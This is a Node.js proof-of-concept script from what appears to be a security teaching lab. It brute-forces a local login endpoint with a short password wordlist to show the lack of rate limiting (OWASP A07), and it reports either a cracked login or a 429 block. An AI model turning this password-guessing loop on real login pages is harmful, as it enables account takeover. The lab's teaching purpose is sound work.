// tools/brute-force.js
// ---------------------------------------------------------------------------
// Proof-of-concept for OWASP A07: the login endpoint has no rate limiting,
// so an attacker can try unlimited password guesses until one works.
//
// EDUCATIONAL — run ONLY against this local lab (http://localhost:3000),
// which you own. Never point it at a system you do not have permission to test.
//
// Run with:  node tools/brute-force.js   (while the app is running)
// ---------------------------------------------------------------------------
const TARGET = 'http://localhost:3000/login';
const username = 'alice';

// A tiny "wordlist". A real attacker uses lists of millions of common
// passwords (e.g. rockyou.txt). We only need a few to make the point.
const passwords = [
  '123456', 'password', 'qwerty', 'letmein', 'welcome',
  'admin', 'alice', 'alice1', 'alice12', 'alice123', 'hunter2',
];

(async () => {
  let attempts = 0;
  for (const password of passwords) {
    attempts++;
    const body = new URLSearchParams({ username, password });

    let res;
    try {
      res = await fetch(TARGET, { method: 'POST', body, redirect: 'manual' });
    } catch (e) {
      console.error('Could not reach the app. Is it running on port 3000?');
      console.error(e.message);
      return;
    }

    // After rate limiting is added, blocked attempts return 429.
    if (res.status === 429) {
      console.log(`[${attempts}] ${username}:${password} -> BLOCKED (429 Too Many Requests)`);
      console.log(`\nRate limiting stopped the attack after ${attempts} attempts. ✅`);
      return;
    }

    // A successful login redirects (302) to /dashboard; a failure re-renders
    // the login page (200).
    const success = res.status === 302;
    console.log(`[${attempts}] ${username}:${password} -> ${success ? 'SUCCESS' : 'fail'}`);

    if (success) {
      console.log(`\n🔓 Cracked in ${attempts} attempts:  ${username} / ${password}`);
      console.log('No rate limiting means an attacker can keep guessing forever.');
      return;
    }
  }

  console.log(`\nTried ${attempts} passwords, none matched (add more to the list).`);
})();
